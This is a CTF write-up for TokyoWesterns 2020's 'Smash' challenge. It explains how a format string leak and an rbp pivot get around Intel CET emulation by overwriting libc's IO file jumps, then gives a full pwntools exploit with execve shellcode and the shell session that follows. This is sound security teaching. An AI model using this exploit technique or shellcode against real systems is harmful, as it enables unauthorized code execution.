---
layout: "post"
title: "Smash - TokyoWesterns CTF 2020"
date: 2020-09-22
tags: [Format Strings, File Structures, Shellcode, Shadown Stack, CTF]
---


**tl;dr**

+ Leak with Format String bug.
+ Use the arbitrary heap pointer write to overwrite `__GI__IO_file_jumps`.
+ Inject shellode in heap and get code execution in `dfprintf`.

<i!--more-->

**Challenge Points:** 388
**Solves:** 9

We really had a great time this weekend playing this year's edition of TokyoWesterns CTF. In this post I'd like to share the intended solution for the challenge **Smash** which we could not solve during the CTF but the idea and the concept involved is worth sharing.

## Challenge description

To begin with , we've been provided with the challenge binary , `libc 2.31`, a runner bash script and a folder containing Intel's tool called Control-flow Enforcement Technology (CET).This was our first tackel with Intel's CET and the concept involved is truly worth sharing. 

```gdb
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : ENABLED
NX        : ENABLED
PIE       : ENABLED
RELRO     : FULL
```

All mitigations except canary have been enabled.

## Reversing

+ The input name function takes 0x20 bytes of user input and then does an `strdup` which stores our input on heap.
+ Next , `dprintf` is called on our input without any format specifier, hence we can leak required addresses with the format string bug.
+ After this , we're asked to enter `y` or `n` and if `y` is entered , the program further asks for another `input message` and then takes in another 0x38 bytes of input.
+ If `n` is entered , the program prints `Bye` with dprintf and directly exits.

Pretty straight forward, but where are the bugs?

## Exploit development

We actually have 2 overflows which let us corrupt rbp and pivot to almost anywhere, but wait, CET doesn't allow us to execute ROP chain directly. We have to find a way to get code execution.

### How Intel's CET works

Control-Flow Enforcement Technology promises to guard a binary against attacks such as ROP, JOP etc. It does so by allocating a `shadow stack` in mapped memory region. Whenever a function is called, apart from storing the return address on the program's thread stack , it also stores it on the shadow stack. So whenever the program returns from the function, the return address is comapared with the one stored on the shadow stack , if a match is found, the program executes smoothly,  and if not , the program aborts thus mitigating ROP.

Intel SDE provides an emulation that includes:

* Stack checks
* Indirect branch checks

From the above discussion, one thing gets clear , every function that is executed in the supervision of CET needs to begin with `endbr64`. Let's just bear that in mind and continue.

## In search of arbitrary write

Since we have our required leaks , we can now corrupt rbp with our first overflow in the step where program asks us to enter `y` or `n`. 

An important observation to be made here is that , after reading our input and storing on heap with strdup, the program copies the heap pointer to an offset of `rbp-0x8`.

Since , we overwrote rbp with an address of our choice , after the function executes `leave` , the rbp will be updated with the value that we specified.

Immediately after that, the following instructions copy the heap pointer storing our input to `rbp-0x8`.

```sh
mov    QWORD PTR [rbp-0x8],rax
mov    rax,QWORD PTR [rbp-0x8]
```

Thus , we have an arbitrary write of a heap pointer.

## Defeating CET

After analyzing a bit ,  we found out that the emulator that the CTF has provided us with does not check for the `NX` bit and few pages have been marked `read-write-executable` allowing us to now inject shellcode.

Now that we can execute shellode, we have to now select a target to get code execution.

## dprintf to the rescue

One important aspect of dprintf is that it uses a `temporary file structure` to carry out it's operations. With file structure operations, we can find out apt targets to get code execution. One such target function pointer is `_IO_new_file_finish` which is called internally inside `dprintf`. 

So , now our plan is :

+ Overwrite rbp to point to `_IO_new_file_finish + 8`.
+ Copy heap address to `_IO_new_file_finish`.
+ Fill heap with shellcode as CET doesn't implement NX.
+ Get code execution in dprintf.

Here's the full exploit code.

```py

from pwn import *
import sys

LIBC = ELF('./libc-2.31.so',checksec = False)
if(len(sys.argv)>1):
    io=remote("pwn01.chal.ctf.westerns.tokyo",29246)
    context.noptrace = True
else:
    io=process("./smash")

reu = lambda a : io.recvuntil(a)
sla = lambda a,b : io.sendlineafter(a,b)
sl = lambda a : io.sendline(a)
rel = lambda : io.recvline()
sa = lambda a,b : io.sendafter(a,b)
re = lambda a : io.recv(a)
s = lambda a : io.send(a)


if __name__ == "__main__":
    gdb.attach(io)
    sla('> ','%p '*9)
    re(55)
    stack = int(re(14),16)
    log.info("stack = " + hex(stack))
    re(1)
    code = int(re(14),16) - 0x1216
    log.info("code = " + hex(code))
    re(7)
    libc = int(re(14),16) - 0x270b3
    log.info("libc = " + hex(libc))
    target_stack = code + 0x40e8 #to be changed
    inp = stack - 0x60
    IO_file_jumps = libc + 0x1ed4a0
    pop_rdi = code + 0x000013d3
    payload  = b"\xf3\x0f\x1e\xfa" # endbr64
    payload += b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    payload += b"\x90" * (0x30 - len(payload))
    payload += p64(IO_file_jumps + 0x10 + 8)[:6]
    sa('[y/n] ',payload)
    #sla('message > ','write to shadow')
    io.interactive()
```

Remember that the shellcode has to be started with `endbr64` instruction to bypass the indirect branch instruction check.

```console
[+] Opening connection to pwn01.chal.ctf.westerns.tokyo on port 29246: Done
[!] Skipping debug attach since context.noptrace==True
[*] stack = 0x7fffc7eb4d00
[*] code = 0x55a74550c000
[*] libc = 0x7f498f5bb000
[*] Switching to interactive mode

Bye!
$ ls
flag.txt
run.sh
sde
sde.tgz
smash
$ cat flag.txt
TWCTF{17_15_ju57_4n_3mul470r,n07_r34l_CET}
```


## Conclusion

This was one of the most interesting challenges I had come across in a while. The idea of a faulty emulator and CET was really cool. Kudos to team TokyoWesterns for such a cool challenge and such an awesome CTF.
